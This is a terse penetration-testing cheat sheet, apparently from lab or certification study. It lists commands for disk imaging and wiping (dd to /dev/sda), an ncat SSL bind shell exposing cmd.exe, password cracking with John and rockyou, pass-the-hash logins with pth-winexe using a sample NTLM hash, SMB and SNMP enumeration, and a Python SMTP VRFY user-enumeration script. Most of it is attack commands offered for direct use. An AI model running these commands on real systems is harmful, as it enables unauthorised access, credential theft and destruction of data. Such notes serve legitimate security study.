## DD
To Copy an Iso file with DD

First find disk size
   
```console
isoinfo -d -i /dev/cdrom
CD-ROM is in ISO 9660 format
System id:
Volume id: ____
Volume set id:
Publisher id:
Data preparer id:
Application id: NERO - BURNING ROM
Copyright File id:
Abstract File id:
Bibliographic File id:
Volume set size is: 1
Volume set sequence number is: 1
Logical block size is: 2048
Volume size is: 33034   
Joliet with UCS level 3 found   
NO Rock Ridge present   
```
Copying the contents

`dd if=/dev/cdrom of=/root/Desktop/folder/file.iso bs=2048 count=33034 status=progress`

Delete contents

`dd if=/dev/zero of=/dev/sda status=progress`

## NC

Good commands

### Bind SSL shell  
on target box

`ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl`

on attacker

`ncat -v 10.0.0.22 4444 --ssl`


Random

nc -4 -u -v -l -p 8001 -k | nc -4 -u -n -v -s 10.10.13.7 225.1.1.13 3113


## John

`john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump`

`unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`

`john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`



## pth-winexe

`export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896`

`pth-winexe -U administrator% //<IP> cmd`

or

`pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 //<IP> cmd`


tool to use when smb is available 

### Enum4linux

`enum4linux -a <ip>`

### Nbtscan

`nbtscan -r <ip>`

others

smbmap

smbclient

rpcclient

net

nmblookup

nmap scripts

## SMTP
VRFY user

`nc -nv 10.10.10.10 25`

`VRFY root`

Python  tool

```
#!/usr/bin/python
import socket
import sys
if len(sys.argv) != 2:
  print "Usage: vrfy.py <username>"
  sys.exit(0)
# Create a Socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect=s.connect(('10.11.1.215',25))
# Receive the banner
banner=s.recv(1024)
print banner
# VRFY a user
s.send('VRFY ' + sys.argv[1] + '\r\n')
result=s.recv(1024)
print result
# Close the socket
s.close()
```

## SNMP
snmpwalk



snmp-check